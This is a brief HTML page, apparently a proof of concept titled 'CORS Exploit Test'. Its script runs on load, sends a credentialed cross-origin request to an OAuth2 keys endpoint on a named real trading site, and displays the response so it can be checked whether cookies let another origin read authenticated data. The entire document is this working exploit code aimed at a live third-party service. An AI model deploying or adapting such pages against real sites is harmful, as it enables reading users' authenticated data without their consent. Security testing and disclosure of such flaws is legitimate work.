<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>CORS Exploit Test</title>
</head>
<body>
    <h2>Testing CORS Cookie Access</h2>
    <pre id="output">Testing...</pre>

<script>
async function test() {
    const output = document.getElementById('output');

    try {
        const res = await fetch("https://smarttrader.deriv.com/oauth2/v1/keys", {
            method: "GET",
            credentials: "include",
        });

        const text = await res.text();

        output.textContent = 
            "Status: " + res.status + "\n\n" +
            "Response (first 500 chars):\n" + text.substring(0, 500);
    }
    catch (e) {
        output.textContent = "Error: " + e;
    }
}

test();
</script>
</body>
</html>
